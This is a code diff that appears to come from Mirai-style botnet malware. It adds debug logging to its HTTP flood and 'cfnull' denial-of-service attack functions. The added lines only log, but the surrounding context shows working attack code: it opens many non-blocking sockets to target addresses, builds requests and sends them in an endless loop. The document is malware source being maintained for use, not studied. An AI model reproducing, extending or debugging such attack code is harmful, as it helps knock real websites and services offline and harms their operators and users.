@@ -34,6 +34,16 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
     int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 80);
 
+#ifdef DEBUG
+    printf("[HTTP_ATTACK] Starting HTTP attack\n");
+    printf("[HTTP_ATTACK] Targets: %u, Options: %u\n", (unsigned)targs_len, (unsigned)opts_len);
+    printf("[HTTP_ATTACK] Method: %s, Domain: %s, Path: %s\n", method ? method : "NULL", domain ? domain : "NULL", path ? path : "NULL");
+    printf("[HTTP_ATTACK] Sockets: %d, Port: %u\n", sockets, (unsigned)dport);
+    debug_logf("=== HTTP ATTACK START ===\n");
+    debug_logf("Method: %s, Domain: %s, Path: %s\n", method ? method : "NULL", domain ? domain : "NULL", path ? path : "NULL");
+    debug_logf("Sockets: %d, Port: %u\n", sockets, (unsigned)dport);
+#endif
+
     char generic_memes[10241] = {0};
 
     if (domain == NULL || path == NULL)
@@ -69,11 +79,21 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
     http_table = calloc(sockets, sizeof(struct attack_http_state));
 
+#ifdef DEBUG
+    printf("[HTTP_ATTACK] Allocated %d HTTP connection states\n", sockets);
+    debug_logf("Allocated %d HTTP connection states\n", sockets);
+#endif
+
     for (i = 0; i < sockets; i++)
     {
         http_table[i].state = HTTP_CONN_INIT;
         http_table[i].fd = -1;
         http_table[i].dst_addr = targs[i % targs_len].addr;
+
+#ifdef DEBUG
+        printf("[HTTP_ATTACK] Setting up connection %d for target %u\n", i, (unsigned)(i % targs_len));
+        debug_logf("Setting up connection %d for target %u\n", i, (unsigned)(i % targs_len));
+#endif
 
         util_strcpy(http_table[i].path, path);
 
@@ -173,6 +193,11 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
         util_strcpy(http_table[i].path, path);
     }
 
+#ifdef DEBUG
+    printf("[HTTP_ATTACK] Starting main attack loop\n");
+    debug_logf("Starting main HTTP attack loop\n");
+#endif
+
     while(TRUE)
     {
         fd_set fdset_rd, fdset_wr;
@@ -180,6 +205,15 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
         struct timeval tim;
         struct attack_http_state *conn;
         uint32_t fake_time = time(NULL);
+
+#ifdef DEBUG
+        static int loop_count = 0;
+        loop_count++;
+        if (loop_count % 1000 == 0) {
+            printf("[HTTP_ATTACK] Main loop iteration %d\n", loop_count);
+            debug_logf("Main loop iteration %d\n", loop_count);
+        }
+#endif
 
         FD_ZERO(&fdset_rd);
         FD_ZERO(&fdset_wr);
@@ -200,10 +234,21 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
             {
                 struct sockaddr_in addr = {0};
 
+#ifdef DEBUG
+                printf("[HTTP_ATTACK] Initializing connection %d\n", i);
+                debug_logf("Initializing connection %d\n", i);
+#endif
+
                 if (conn->fd != -1)
                     close(conn->fd);
                 if ((conn->fd = socket(AF_INET, SOCK_STREAM, 0)) == -1)
+                {
+#ifdef DEBUG
+                    printf("[HTTP_ATTACK] Failed to create socket for connection %d\n", i);
+                    debug_logf("Failed to create socket for connection %d\n", i);
+#endif
                     continue;
+                }
 
                 fcntl(conn->fd, F_SETFL, O_NONBLOCK | fcntl(conn->fd, F_GETFL, 0));
 
@@ -216,6 +261,22 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
 
                 conn->last_recv = fake_time;
                 conn->state = HTTP_CONN_CONNECTING;
+                
+#ifdef DEBUG
+                printf("[HTTP_ATTACK] Connecting to %u.%u.%u.%u:%u\n", 
+                       (unsigned char)(conn->dst_addr & 0xff),
+                       (unsigned char)((conn->dst_addr >> 8) & 0xff),
+                       (unsigned char)((conn->dst_addr >> 16) & 0xff),
+                       (unsigned char)((conn->dst_addr >> 24) & 0xff),
+                       (unsigned)ntohs(addr.sin_port));
+                debug_logf("Connecting to %u.%u.%u.%u:%u\n", 
+                          (unsigned char)(conn->dst_addr & 0xff),
+                          (unsigned char)((conn->dst_addr >> 8) & 0xff),
+                          (unsigned char)((conn->dst_addr >> 16) & 0xff),
+                          (unsigned char)((conn->dst_addr >> 24) & 0xff),
+                          (unsigned)ntohs(addr.sin_port));
+#endif
+                
                 connect(conn->fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
 
                 FD_SET(conn->fd, &fdset_wr);
@@ -238,6 +299,11 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
             }
             else if (conn->state == HTTP_CONN_SEND)
             {
+#ifdef DEBUG
+                printf("[HTTP_ATTACK] Sending HTTP request for connection %d\n", i);
+                debug_logf("Sending HTTP request for connection %d\n", i);
+#endif
+
                 conn->content_length = -1; 
                 conn->protection_type = 0;
                 util_zero(conn->rdbuf, HTTP_RDBUF_SIZE);
@@ -309,7 +375,17 @@ void attack_app_http(uint8_t targs_len, struct attack_target *targs, uint8_t opt
                 }
 #endif
 
-                send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
+                int sent_bytes = send(conn->fd, buf, util_strlen(buf), MSG_NOSIGNAL);
+                
+#ifdef DEBUG
+                printf("[HTTP_ATTACK] Sent %d bytes to connection %d\n", sent_bytes, i);
+                debug_logf("Sent %d bytes to connection %d\n", sent_bytes, i);
+                if (sent_bytes == -1) {
+                    printf("[HTTP_ATTACK] Send failed for connection %d (errno=%d)\n", i, errno);
+                    debug_logf("Send failed for connection %d (errno=%d)\n", i, errno);
+                }
+#endif
+
                 conn->last_send = fake_time;
 
                 conn->state = HTTP_CONN_RECV_HEADER;
@@ -852,6 +928,14 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
     char *domain = attack_get_opt_str(opts_len, opts, ATK_OPT_DOMAIN, NULL);
     int sockets = attack_get_opt_int(opts_len, opts, ATK_OPT_CONNS, 1);
 
+#ifdef DEBUG
+    printf("[CFNULL_ATTACK] Starting CFNULL attack\n");
+    printf("[CFNULL_ATTACK] Targets: %u, Options: %u\n", (unsigned)targs_len, (unsigned)opts_len);
+    printf("[CFNULL_ATTACK] Domain: %s, Sockets: %d\n", domain ? domain : "NULL", sockets);
+    debug_logf("=== CFNULL ATTACK START ===\n");
+    debug_logf("Domain: %s, Sockets: %d\n", domain ? domain : "NULL", sockets);
+#endif
+
     char generic_memes[10241] = {0};
 
     if (domain == NULL)
@@ -956,6 +1040,11 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
         }
     }
 
+#ifdef DEBUG
+    printf("[CFNULL_ATTACK] Starting main CFNULL attack loop\n");
+    debug_logf("Starting main CFNULL attack loop\n");
+#endif
+
     while(TRUE)
     {
         fd_set fdset_rd, fdset_wr;
@@ -963,6 +1052,15 @@ void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t o
         struct timeval tim;
         struct attack_cfnull_state *conn;
         uint32_t fake_time = time(NULL);
+
+#ifdef DEBUG
+        static int cfnull_loop_count = 0;
+        cfnull_loop_count++;
+        if (cfnull_loop_count % 1000 == 0) {
+            printf("[CFNULL_ATTACK] Main loop iteration %d\n", cfnull_loop_count);
+            debug_logf("CFNULL main loop iteration %d\n", cfnull_loop_count);
+        }
+#endif
 
         FD_ZERO(&fdset_rd);
         FD_ZERO(&fdset_wr);
